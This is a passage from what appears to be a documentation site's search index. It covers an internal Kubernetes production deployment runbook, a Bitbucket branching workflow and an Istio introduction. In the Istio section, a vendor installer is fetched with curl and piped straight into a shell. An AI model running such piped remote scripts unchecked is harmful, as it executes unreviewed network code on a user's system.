./doppler/doppler_2_install_kubernetes_operator.sh The output is similar to this: namespace/bic-doppler-operator-system created customresourcedefinition.apiextensions.k8s.io/dopplersecrets.secrets.doppler.com created serviceaccount/doppler-operator-controller-manager created role.rbac.authorization.k8s.io/doppler-operator-leader-election-role created clusterrole.rbac.authorization.k8s.io/doppler-operator-manager-role created clusterrole.rbac.authorization.k8s.io/doppler-operator-metrics-reader created clusterrole.rbac.authorization.k8s.io/doppler-operator-proxy-role created rolebinding.rbac.authorization.k8s.io/doppler-operator-leader-election-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/doppler-operator-manager-rolebinding created clusterrolebinding.rbac.authorization.k8s.io/doppler-operator-proxy-rolebinding created configmap/doppler-operator-manager-config created service/doppler-operator-controller-manager-metrics-service created deployment.apps/doppler-operator-controller-manager created Create Doppler secrets - this will create all secrets to connect to Doppler ./doppler/doppler_3_setup_secrets.sh The output is similar to this: secret/bic-chat-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-chat-pro-doppler-secret created secret/bic-comm-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-comm-pro-doppler-secret created secret/bic-stream-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-stream-pro-doppler-secret created secret/bic-notification-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-notification-pro-doppler-secret created secret/bic-upload-kaltura-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-upload-kaltura-pro-doppler-secret created secret/bic-upload-manage-pro-doppler-token-secret created dopplersecret.secrets.doppler.com/bic-upload-manage-pro-doppler-secret created","title":"Create Doppler secrets"},{"location":"content/en/docs/bic/production_in_may2020/#create-self-host-kafka-kubernetes-cluster-in-digitalocean","text":"Create Kubernetes cluster name: bein-pro-sgp1-k8s-kafka-cluster With node pool and capacities Node pool Capacity # of node kafka-pro-basic40-pool 4vCPU, 8GB RAM 1 kafka-pro-10-pool 1vCPU, 2GB RAM 2 Create Kafka Kubernetes cluster ./kafka/kafka_1_nodeport_cluster_SCRAM.sh The output is similar to this: namespace/kafka created % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 751k 100 751k 0 0 334k 0 0 :00:02 0 :00:02 --:--:-- 2231k customresourcedefinition.apiextensions.k8s.io/strimzipodsets.core.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkausers.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkas.kafka.strimzi.io created clusterrole.rbac.authorization.k8s.io/strimzi-cluster-operator-namespaced created clusterrole.rbac.authorization.k8s.io/strimzi-kafka-broker created customresourcedefinition.apiextensions.k8s.io/kafkaconnects.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkaconnectors.kafka.strimzi.io created deployment.apps/strimzi-cluster-operator created customresourcedefinition.apiextensions.k8s.io/kafkarebalances.kafka.strimzi.io created rolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator created clusterrole.rbac.authorization.k8s.io/strimzi-cluster-operator-global created customresourcedefinition.apiextensions.k8s.io/kafkabridges.kafka.strimzi.io created customresourcedefinition.apiextensions.k8s.io/kafkamirrormaker2s.kafka.strimzi.io created rolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-entity-operator-delegation created clusterrole.rbac.authorization.k8s.io/strimzi-kafka-client created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-kafka-client-delegation created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator created customresourcedefinition.apiextensions.k8s.io/kafkatopics.kafka.strimzi.io created clusterrolebinding.rbac.authorization.k8s.io/strimzi-cluster-operator-kafka-broker-delegation created configmap/strimzi-cluster-operator created clusterrole.rbac.authorization.k8s.io/strimzi-entity-operator created customresourcedefinition.apiextensions.k8s.io/kafkamirrormakers.kafka.strimzi.io created serviceaccount/strimzi-cluster-operator created kafka.kafka.strimzi.io/my-cluster created kafkatopic.kafka.strimzi.io/my-topic created secret/bic-comm-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-comm-pro-kafka-user created secret/bic-chat-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-chat-pro-kafka-user created secret/bic-stream-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-stream-pro-kafka-user created secret/bic-notification-pro-kafka-secret created kafkauser.kafka.strimzi.io/bic-notification-pro-kafka-user created secret/kafka-test-secret created kafkauser.kafka.strimzi.io/kafka-test created NAME READY STATUS RESTARTS AGE strimzi-cluster-operator-585f6fd9d7-8vm59 0 /1 ContainerCreating 0 8s strimzi-cluster-operator-585f6fd9d7-8vm59 0 /1 Running 0 17s strimzi-cluster-operator-585f6fd9d7-8vm59 1 /1 Running 0 31s my-cluster-zookeeper-0 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 0s my-cluster-zookeeper-0 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 0s my-cluster-zookeeper-2 0 /1 Pending 0 0s my-cluster-zookeeper-2 0 /1 Pending 0 0s my-cluster-zookeeper-1 0 /1 Pending 0 4s my-cluster-zookeeper-1 0 /1 ContainerCreating 0 4s my-cluster-zookeeper-0 0 /1 Pending 0 8s my-cluster-zookeeper-2 0 /1 Pending 0 8s my-cluster-zookeeper-0 0 /1 ContainerCreating 0 8s my-cluster-zookeeper-2 0 /1 ContainerCreating 0 8s my-cluster-zookeeper-1 0 /1 Running 0 29s my-cluster-zookeeper-2 0 /1 Running 0 29s my-cluster-zookeeper-0 0 /1 Running 0 30s my-cluster-zookeeper-1 1 /1 Running 0 45s my-cluster-zookeeper-0 1 /1 Running 0 49s my-cluster-zookeeper-2 1 /1 Running 0 49s my-cluster-kafka-0 0 /1 Pending 0 0s my-cluster-kafka-1 0 /1 Pending 0 0s my-cluster-kafka-0 0 /1 Pending 0 0s my-cluster-kafka-2 0 /1 Pending 0 0s my-cluster-kafka-1 0 /1 Pending 0 0s my-cluster-kafka-2 0 /1 Pending 0 0s my-cluster-kafka-0 0 /1 Pending 0 4s my-cluster-kafka-2 0 /1 Pending 0 4s my-cluster-kafka-0 0 /1 Init:0/1 0 4s my-cluster-kafka-2 0 /1 Init:0/1 0 4s my-cluster-kafka-1 0 /1 Pending 0 8s my-cluster-kafka-1 0 /1 Init:0/1 0 8s my-cluster-kafka-2 0 /1 Init:0/1 0 18s my-cluster-kafka-2 0 /1 PodInitializing 0 21s my-cluster-kafka-2 0 /1 Running 0 22s my-cluster-kafka-0 0 /1 Init:0/1 0 26s my-cluster-kafka-1 0 /1 Init:0/1 0 29s my-cluster-kafka-0 0 /1 PodInitializing 0 34s my-cluster-kafka-0 0 /1 Running 0 35s my-cluster-kafka-1 0 /1 PodInitializing 0 39s my-cluster-kafka-1 0 /1 Running 0 40s my-cluster-kafka-2 1 /1 Running 0 55s my-cluster-kafka-1 1 /1 Running 0 68s my-cluster-kafka-0 1 /1 Running 0 75s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Pending 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Pending 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 ContainerCreating 0 0s my-cluster-entity-operator-58f4844c45-nqdxs 0 /3 Running 0 18s my-cluster-entity-operator-58f4844c45-nqdxs 1 /3 Running 0 22s my-cluster-entity-operator-58f4844c45-nqdxs 1 /3 Running 0 22s my-cluster-entity-operator-58f4844c45-nqdxs 2 /3 Running 0 40s my-cluster-entity-operator-58f4844c45-nqdxs 3 /3 Running 0 50s Export all client certificates and scram credentials cd kafka ./kafka_2_export_certificates.sh ls -la The output is similar to this: total 152 drwxr-xr-x 20 vi staff 640 Jun 7 09 :34 . drwxr-xr-x 49 vi staff 1568 Jun 7 14 :14 .. -rw-r--r-- 1 vi staff 152 Jun 7 14 :18 bic-chat-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-chat-pro-kafka-user.password -rw-r--r-- 1 vi staff 152 Jun 7 14 :18 bic-comm-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-comm-pro-kafka-user.password -rw-r--r-- 1 vi staff 160 Jun 7 14 :18 bic-notification-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-notification-pro-kafka-user.password -rw-r--r-- 1 vi staff 154 Jun 7 14 :18 bic-stream-pro-kafka-user.config -rw-r--r-- 1 vi staff 40 Jun 7 14 :18 bic-stream-pro-kafka-user.password -rw-r--r-- 1 vi staff 1854 Jun 7 14 :18 ca.crt -rw-r--r-- 1 vi staff 1687 Jun 7 14 :18 ca.p12 -rw-r--r-- 1 vi staff 12 Jun 7 14 :18 ca.password -rw-r--r-- 1 vi staff 1854 Jun 7 14 :18 client-cert.pem -rw-r--r-- 1 vi staff 3272 Jun 7 14 :18 client-key.pem -rw-r--r-- 1 vi staff 1441 Jun 7 09 :34 docker-compose.yml -rw-r--r-- 1 vi staff 107 Jun 7 14 :18 kafka-test.config -rw-r--r-- 1 vi staff 8 Jun 7 14 :18 kafka-test.password -rwxr-xr-x 1 vi staff 5099 Jun 7 09 :34 kafka_1_nodeport_cluster_SCRAM.sh -rwxr-xr-x 1 vi staff 3078 Jun 7 09 :34 kafka_2_export_certificates.sh","title":"Create self-host Kafka Kubernetes cluster in DigitalOcean"},{"location":"content/en/docs/bic/production_in_may2020/#create-newrelic-api-key-and-fluentd-on-kubernetes-cluster","text":"","title":"Create NewRelic API key and Fluentd on Kubernetes cluster"},{"location":"content/en/docs/bic/production_in_may2020/#create-newrelic-api-key","text":"Access https://one.newrelic.com/launcher/api-keys-ui.api-keys-launcher Create a key Choose Key type : Ingest - License Name : k8s log Click Create a key Create base64 encoded format for the newly generated API key and update the data.LICENSE_KEY in the secret object in newrelic_1_install_fluentd_components.sh script Encode base64 the license key above echo -n 'content-of-the-new-API-key' | base64 Y29udGVudC1vZi10aGUtbmV3LUFQSS1rZXk = Insert the base64 encoded output to the data.LICENCE_KEY cat <<EOF | kubectl apply -f - apiVersion: v1 kind: Secret metadata: name: fluentd-aggregation namespace: kube-system data: BASE_URI: # content hide LICENSE_KEY: Y29udGVudC1vZi10aGUtbmV3LUFQSS1rZXk= # <== paste here EOF The output is similar to this: secret/fluentd-aggregation created","title":"Create NewRelic API key"},{"location":"content/en/docs/bic/production_in_may2020/#install-fluentd-on-kubernetes-cluster","text":"Switch to Production Kubernetes cluster kubectl config use-context do -k8s-production The output is similar to this: Switched to context \"do-k8s-production\" . Install Fluentd aggregation ./newrelic/newrelic_1_install_fluentd_components.sh The output is similar to this: daemonset.apps/fluentd-agent created clusterrole.rbac.authorization.k8s.io/fluentd created clusterrolebinding.rbac.authorization.k8s.io/fluentd created configmap/fluentd-aggregation-config created deployment.apps/fluentd-aggregation created secret/fluentd-aggregation configured service/fluentd-aggregation created serviceaccount/fluentd created Update the Ingress log format ./newrelic/newrelic_2_update_ingress_log_format.sh The output is similar to this: configmap/ingress-nginx-controller created","title":"Install Fluentd on Kubernetes cluster"},{"location":"content/en/docs/bic/production_in_may2020/#create-sendgrid-api-key-and-verify-sender-email","text":"","title":"Create SendGrid API key and verify sender email"},{"location":"content/en/docs/bic/production_in_may2020/#bein-chat-deployment","text":"","title":"Bein Chat Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#drop-postgres-all-tables","text":"","title":"Drop Postgres all tables"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-chat-backend-and-chat-frontend-in-kubernetes-cluster","text":"Switch to Production Kubernetes cluster kubectl config use-context do -k8s-production The output is similar to this: Switched to context \"do-k8s-production\" . Create PVCs for Chat ./chat/chat_1_create_pvc.sh The output is similar to this: persistentvolumeclaim/do-vol-mattermost-data-pvc created persistentvolumeclaim/do-vol-mattermost-plugins-pvc created persistentvolumeclaim/do-vol-mattermost-client-plugins-pvc created persistentvolumeclaim/do-vol-mattermost-config-pvc created Deploy CI/CD job to branch master for bein-mattermost-server and bein-chat-web source code Upload the updated config.json file to newly deployed Chat server ./chat/chat_2_copy_config_file.sh Restart the Chat server by delete the running Pod (example name bein-mattermost-7b67589799-kihj5 ) kubectl rollout restart deployment bein-mattermost The output is similar to this: deployment.apps/bein-mattermost restarted Verify the new Chat server Pod is in Running state kubectl get pod The output is similar to this: NAME READY STATUS RESTARTS AGE bein-mattermost-674db8c96d-twcl5 0 /1 Terminating 0 4h19m bein-mattermost-7bbbb64d64-b7t82 1 /1 Running 0 12s","title":"Deploy Chat backend and Chat frontend in Kubernetes cluster"},{"location":"content/en/docs/bic/production_in_may2020/#create-chat-system-admin","text":"Follow the instruction below: https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-21065","title":"Create Chat System Admin"},{"location":"content/en/docs/bic/production_in_may2020/#upload-chat-plugins","text":"Follow the instruction below: https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-24907","title":"Upload Chat plugins"},{"location":"content/en/docs/bic/production_in_may2020/#setup-sendgrid-email-on-chat","text":"","title":"Setup SendGrid email on Chat"},{"location":"content/en/docs/bic/production_in_may2020/#setup-push-notification-proxy-on-kubernetes-cluster","text":"Install Push Notification Proxy ./chat/chat_3_install_push_notification_proxy.sh The output is similar to this: configmap/mattermost-push-noti-configmap created service/bein-mattermost-push-noti-proxy created deployment.apps/bein-mattermost-push-noti-proxy created https://app.clickup.com/3649385/v/dc/3fbv9-16924/3fbv9-20125","title":"Setup Push Notification Proxy on Kubernetes cluster"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-chat-app","text":"","title":"Deploy Chat app"},{"location":"content/en/docs/bic/production_in_may2020/#bein-comm-deployment","text":"","title":"Bein Comm Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#truncate-old-postgres-data","text":"","title":"Truncate old Postgres data"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-comm-backend","text":"Update environment variables of bic-comm Production environment on Doppler Merge code of bein-backend repository from staging to master branch","title":"Deploy Comm backend"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-comm-web","text":"","title":"Deploy Comm web"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-comm-app","text":"","title":"Deploy Comm app"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-comm-web-staff","text":"","title":"Deploy Comm web staff"},{"location":"content/en/docs/bic/production_in_may2020/#bein-stream-deployment","text":"","title":"Bein Stream Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-stream-backend","text":"Update environment variables of bic-stream Production environment on Doppler Merge code of bein-stream repository from staging to master branch","title":"Deploy Stream backend"},{"location":"content/en/docs/bic/production_in_may2020/#create-bein_stream-schema-in-postgres","text":"Create bein_stream schema","title":"Create bein_stream schema in Postgres"},{"location":"content/en/docs/bic/production_in_may2020/#bein-notification-deployment","text":"","title":"Bein Notification Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#deploy-notification-backend","text":"Update environment variables of bic-stream Production environment on Doppler Merge code of bein-stream repository from staging to master branch","title":"Deploy Notification backend"},{"location":"content/en/docs/bic/production_in_may2020/#create-bein_notification-schema-in-postgres","text":"Create bein_notification schema","title":"Create bein_notification schema in Postgres"},{"location":"content/en/docs/bic/production_in_may2020/#post-deployment","text":"","title":"Post-deployment"},{"location":"content/en/docs/bic/production_in_may2020/#update-ingress-controller-resources-in-kubernetes-cluster","text":"Update Ingress Controller resources ./nginx-ingress/ingress_1_update_ingress.sh The output is similar to this: ingress.networking.k8s.io/bein-group-ingress configured","title":"Update Ingress Controller resources in Kubernetes cluster"},{"location":"content/en/docs/bic/production_in_may2020/#create-super-admin-and-bic-team-accounts","text":"","title":"Create Super Admin and BIC Team accounts"},{"location":"content/en/docs/bic/production_in_may2020/#create-communities-and-groups","text":"","title":"Create Communities and Groups"},{"location":"content/en/docs/bic/production_in_may2020/#bein-upload-deployment","text":"","title":"Bein Upload Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#bein-upload-kaltura-deployment","text":"Update environment variables of bic-upload-kaltura Production environment on Doppler Merge code of bein-upload-kaltura repository from staging to master branch","title":"Bein Upload Kaltura Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#bein-upload-manage-deployment","text":"Update environment variables of bic-upload-manage Production environment on Doppler Merge code of bein-upload-manage repository from staging to master branch","title":"Bein Upload Manage Deployment"},{"location":"content/en/docs/bic/production_in_may2020/#api-gateway-apisix","text":"Create APISIX and APISIX Ingress Controller ./apisix/apisix_1_install_apisix_and_ingress_controller.sh The output is similar to this: Hang tight while we grab the latest from your chart repositories... ...Successfully got an update from the \"apisix\" chart repository Update Complete. \u2388Happy Helming!\u2388 NAME: apisix LAST DEPLOYED: Thu Jun 23 15 :49:53 2022 NAMESPACE: ingress-apisix STATUS: deployed REVISION: 1 TEST SUITE: None NOTES: 1 . Get the application URL by running these commands: NOTE: It may take a few minutes for the LoadBalancer IP to be available. You can watch the status of by running 'kubectl get --namespace ingress-apisix svc -w apisix-gateway' export SERVICE_IP = $( kubectl get svc --namespace ingress-apisix apisix-gateway --template \"{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}\" ) echo http:// $SERVICE_IP :80 Create APISIX-Dashboard ./apisix/apisix_2_install_apisix_dashboard.sh The output is similar to this: Hang tight while we grab the latest from your chart repositories... ...Successfully got an update from the \"apisix\" chart repository Update Complete. \u2388Happy Helming!\u2388 NAME: apisix-dashboard LAST DEPLOYED: Thu Jun 23 15 :50:15 2022 NAMESPACE: ingress-apisix STATUS: deployed REVISION: 1 NOTES: 1 . Get the application URL by running these commands: export POD_NAME = $( kubectl get pods --namespace ingress-apisix -l \"app.kubernetes.io/name=apisix-dashboard,app.kubernetes.io/instance=apisix-dashboard\" -o jsonpath = \"{.items[0].metadata.name}\" ) export CONTAINER_PORT = $( kubectl get pod --namespace ingress-apisix $POD_NAME -o jsonpath = \"{.spec.containers[0].ports[0].containerPort}\" ) echo \"Visit http://127.0.0.1:8080 to use your application\" kubectl --namespace ingress-apisix port-forward $POD_NAME 8080 : $CONTAINER_PORT Update APISIX configuration to include the cognito-auth plugin ./apisix/apisix_3_update_apisix_config.sh Update APISIX-Dashboard configuration to include the cognito-auth plugin ./apisix/apisix_4_update_apisix_dashboard_config.sh Create APISIX routess by APISIX ingress resource ./apisix/apisix_5_create_apisix_routes_by_ingress_controller.sh The output is similar to this: ingress.networking.k8s.io/bic-apisix-ingress created To create an IAM OIDC identity provider for your cluster with the AWS Management Console Open the Amazon EKS console at https://console.aws.amazon.com/eks/home#/clusters. Select the name of your cluster. In the Details section on the Overview tab, note the value of the OpenID Connect provider URL. Open the IAM console at https://console.aws.amazon.com/iam/. In the left navigation pane, choose Identity Providers under Access management. If a Provider is listed that matches the URL for your cluster, then you already have a provider for your cluster. If a provider isn't listed that matches the URL for your cluster, then you must create one. To create a provider, choose Add Provider. For Provider Type, choose OpenID Connect. For Provider URL, paste the OIDC issuer URL for your cluster, and then choose Get thumbprint. For Audience, enter sts.amazonaws.com and choose Add provider.","title":"API Gateway (APISIX)"},{"location":"content/en/docs/devops/devops-bitbucket/","tags":["Bitbucket"],"text":"Bitbucket \u00b6 Workflow \u00b6 Create A Branch Locally \u00b6 List the branches on your repository git branch The output is similar to this: * master ( END ) Press q to return to the terminal Create a new feature branch in the repository git branch bein-sandbox-kube-base Switch to the feature branch to work on it git checkout bein-sandbox-kube-base The output is similar to this: Switched to branch 'bein-sandbox-kube-base' Commit the change(s) to the feature branch git add -A git commit -m \"Added a change from the feature branch\" The output is similar to this: On branch bein-sandbox-kube-base nothing to commit, working tree clean Switch back to the master branch git checkout master The output is similar to this: Switched to branch 'master' Your branch is up to date with 'origin/master' . Switch back to the master branch git push origin bein-sandbox-kube-base The output is similar to this: Total 0 ( delta 0 ) , reused 0 ( delta 0 ) , pack-reused 0 remote: remote: Create pull request for bein-sandbox-kube-base: remote: https://bitbucket.org/nhamchanvi/bein-kube-base/pull-requests/new?source = bein-sandbox-kube-base & t = 1 remote: To bitbucket.org:nhamchanvi/bein-kube-base.git * [ new branch ] bein-sandbox-kube-base -> bein-sandbox-kube-base Branch Permission \u00b6 Branching Model \u00b6 Whatsnext \u00b6","title":"Bitbucket"},{"location":"content/en/docs/devops/devops-bitbucket/#bitbucket","text":"","title":"Bitbucket"},{"location":"content/en/docs/devops/devops-bitbucket/#workflow","text":"","title":"Workflow"},{"location":"content/en/docs/devops/devops-bitbucket/#create-a-branch-locally","text":"List the branches on your repository git branch The output is similar to this: * master ( END ) Press q to return to the terminal Create a new feature branch in the repository git branch bein-sandbox-kube-base Switch to the feature branch to work on it git checkout bein-sandbox-kube-base The output is similar to this: Switched to branch 'bein-sandbox-kube-base' Commit the change(s) to the feature branch git add -A git commit -m \"Added a change from the feature branch\" The output is similar to this: On branch bein-sandbox-kube-base nothing to commit, working tree clean Switch back to the master branch git checkout master The output is similar to this: Switched to branch 'master' Your branch is up to date with 'origin/master' . Switch back to the master branch git push origin bein-sandbox-kube-base The output is similar to this: Total 0 ( delta 0 ) , reused 0 ( delta 0 ) , pack-reused 0 remote: remote: Create pull request for bein-sandbox-kube-base: remote: https://bitbucket.org/nhamchanvi/bein-kube-base/pull-requests/new?source = bein-sandbox-kube-base & t = 1 remote: To bitbucket.org:nhamchanvi/bein-kube-base.git * [ new branch ] bein-sandbox-kube-base -> bein-sandbox-kube-base","title":"Create A Branch Locally"},{"location":"content/en/docs/devops/devops-bitbucket/#branch-permission","text":"","title":"Branch Permission"},{"location":"content/en/docs/devops/devops-bitbucket/#branching-model","text":"","title":"Branching Model"},{"location":"content/en/docs/devops/devops-bitbucket/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/devops/devops-istio/","tags":["monoliths","microservices","service mesh"],"text":"Istio Service Mesh \u00b6 Service Mesh introduction Istio Introduction \u00b6 Monoliths vs Microservices \u00b6 Pros of Microservices \u00b6 Scalability. Faster, smaller releases, and less risky. Technology and language agnostic Development lifecycle. System resiliency and isolation. Independent and easy to understand services. Cons of Microservices \u00b6 Complex Service Networking Security Observability Overload for Traditional Operation Models Single proxy in the form of a sidecar container to replace all the different requirements into each microservice. The proxies communicate with each other through what is known as a data plane and they communicate to a server site component called control plane. Control plane manages all the traffic into and out of your services via proxies, so all the networking logic is abstracted from your business code. This approach is known as a Service Mesh. Service Mesh \u00b6 What is Service Mesh? \u00b6 Service Mesh is a dedicated and configurable infrastructure layer that handles the communication between services without having to change the code in a microservice architecture. What is Service Mesh Responsible For? \u00b6 With the Service Mesh, you can dynamically configure how services talk to each other. When services talk to one another, you'll have mutual TLS, so your workloads can be secure. You can see thing better. For example, how the application is doing end-to-end, where it is having issues and bottlenecks, and service discovery which covers three main topics: Discovery - you need to know at which IP and port services are exposed so they can find each other. Health Check - helps you dynamically keep services that are up in the mesh while services that are down are left out. Load Balancing - routes the traffic to healthy instances and cuts it off from the ones who have been failing. Istio \u00b6 Istio is a free and open-source service mesh that provides an efficient way to secure, connect, and monitor services. Istio works with Kubernetes and traditional workloads, thereby bringing universal traffic management, telemetry and security to complex deployments. Istio is supported and implemented by leading cloud providers and consultants. Proxy service that takes care of all the tasks that should be outsourced from the microservice. These proxies and the communication between them form the data plane. Istio implements these proxies using an open-source, high-performance proxy known as Envoy. The proxies talk to a server side component known as the control plan. Originally, the control plane consisted of three components named Citadel, Pilot, and Galley. Citadel managed certificate generation. Pilot helped with service discovery. Galley helped in validating configuration file. The three components were later combined into a single daemon called Istiod. Each service or pod has a separate component in it along with the Envoy proxy called the Istio Agent. Istio Agent is responsible for passing configuration secrets to the Envoy proxies. Installing Istioctl \u00b6 Download the Istio latest binary and install it curl -L https://istio.io/downloadIstio | sh - The output is similar to this: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 101 100 101 0 0 136 0 --:--:-- --:--:-- --:--:-- 137 100 4926 100 4926 0 0 4070 0 0 :00:01 0 :00:01 --:--:-- 4070 Downloading istio-1.14.1 from https://github.com/istio/istio/releases/download/1.14.1/istio-1.14.1-osx.tar.gz ... Istio 1 .14.1 Download Complete! Istio has been successfully downloaded into the istio-1.14.1 folder on your system. Next Steps: See https://istio.io/latest/docs/setup/install/ to add Istio to your Kubernetes cluster. To configure the istioctl client tool for your workstation, add the /Users/vi/DevSecOps/demo/istio/istio-1.14.1/bin directory to your environment path variable with: export PATH = \" $PATH :/Users/vi/DevSecOps/demo/istio/istio-1.14.1/bin\" Begin the Istio pre-installation check by running: istioctl x precheck Need more information? Visit https://istio.io/latest/docs/setup/install/ Move to the Istio directory, this directory is also named with the Istio version you downloaded cd istio-1.14.1 Add the istioctl client to our path export PATH = $PWD /bin: $PATH Check if istioctl is installed istioctl version The output is similar to this: no running Istio pods in \"istio-system\" 1 .14.1 Check if our cluster has Istio installed istioctl verify-install The output is similar to this: 0 Istio control planes detected, checking --revision \"default\" only error while fetching revision : the server could not find the requested resource 0 Istio injectors detected Error: could not load IstioOperator from cluster: the server could not find the requested resource. Use --filename Installing Istio on your cluster \u00b6 There are 3 different approaches to install Istio on cluster Install with Istioctl istioctl install --set profile = demo -y The output is similar to this: \u2714 Istio core installed \u2714 Istiod installed \u2714 Egress gateways installed \u2714 Ingress gateways installed \u2714 Installation complete Making this installation the default for injection and validation. Thank you for installing Istio 1 .14. Please take a few minutes to tell us about your install/upgrade experience! https://forms.gle/yEtCbt45FZ3VoDT5A Check if our cluster has Istio installed istioctl verify-install The output is similar to this: 1 Istio control planes detected, checking --revision \"default\" only \u2714 Deployment: istio-egressgateway.istio-system checked successfully \u2714 PodDisruptionBudget: istio-egressgateway.istio-system checked successfully \u2714 Role: istio-egressgateway-sds.istio-system checked successfully \u2714 RoleBinding: istio-egressgateway-sds.istio-system checked successfully \u2714 Service: istio-egressgateway.istio-system checked successfully \u2714 ServiceAccount: istio-egressgateway-service-account.istio-system checked successfully \u2714 ClusterRole: istiod-istio-system.istio-system checked successfully \u2714 ClusterRole: istio-reader-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istio-reader-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-istio-system.istio-system checked successfully \u2714 ServiceAccount: istio-reader-service-account.istio-system checked successfully \u2714 Role: istiod-istio-system.istio-system checked successfully \u2714 RoleBinding: istiod-istio-system.istio-system checked successfully \u2714 ServiceAccount: istiod-service-account.istio-system checked successfully \u2714 CustomResourceDefinition: wasmplugins.extensions.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: destinationrules.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: envoyfilters.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: gateways.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: proxyconfigs.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: serviceentries.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: sidecars.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: virtualservices.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: workloadentries.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: workloadgroups.networking.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: authorizationpolicies.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: peerauthentications.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: requestauthentications.security.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: telemetries.telemetry.istio.io.istio-system checked successfully \u2714 CustomResourceDefinition: istiooperators.install.istio.io.istio-system checked successfully \u2714 ClusterRole: istiod-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRole: istiod-gateway-controller-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istiod-gateway-controller-istio-system.istio-system checked successfully \u2714 ConfigMap: istio.istio-system checked successfully \u2714 Deployment: istiod.istio-system checked successfully \u2714 ConfigMap: istio-sidecar-injector.istio-system checked successfully \u2714 MutatingWebhookConfiguration: istio-sidecar-injector.istio-system checked successfully \u2714 PodDisruptionBudget: istiod.istio-system checked successfully \u2714 ClusterRole: istio-reader-clusterrole-istio-system.istio-system checked successfully \u2714 ClusterRoleBinding: istio-reader-clusterrole-istio-system.istio-system checked successfully \u2714 Role: istiod.istio-system checked successfully \u2714 RoleBinding: istiod.istio-system checked successfully \u2714 Service: istiod.istio-system checked successfully \u2714 ServiceAccount: istiod.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.11.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.11.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.12.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.12.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.13.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.13.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.14.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.14.istio-system checked successfully \u2714 EnvoyFilter: stats-filter-1.15.istio-system checked successfully \u2714 EnvoyFilter: tcp-stats-filter-1.15.istio-system checked successfully \u2714 ValidatingWebhookConfiguration: istio-validator-istio-system.istio-system checked successfully \u2714 Deployment: istio-ingressgateway.istio-system checked successfully \u2714 PodDisruptionBudget: istio-ingressgateway.istio-system checked successfully \u2714 Role: istio-ingressgateway-sds.istio-system checked successfully \u2714 RoleBinding: istio-ingressgateway-sds.istio-system checked successfully \u2714 Service: istio-ingressgateway.istio-system checked successfully \u2714 ServiceAccount: istio-ingressgateway-service-account.istio-system checked successfully Checked 15 custom resource definitions Checked 3 Istio Deployments \u2714 Istio is installed and verified successfully Istio Operator Install Install with Helm There are also different profiles for production and performance testing and it's important to know that different environments 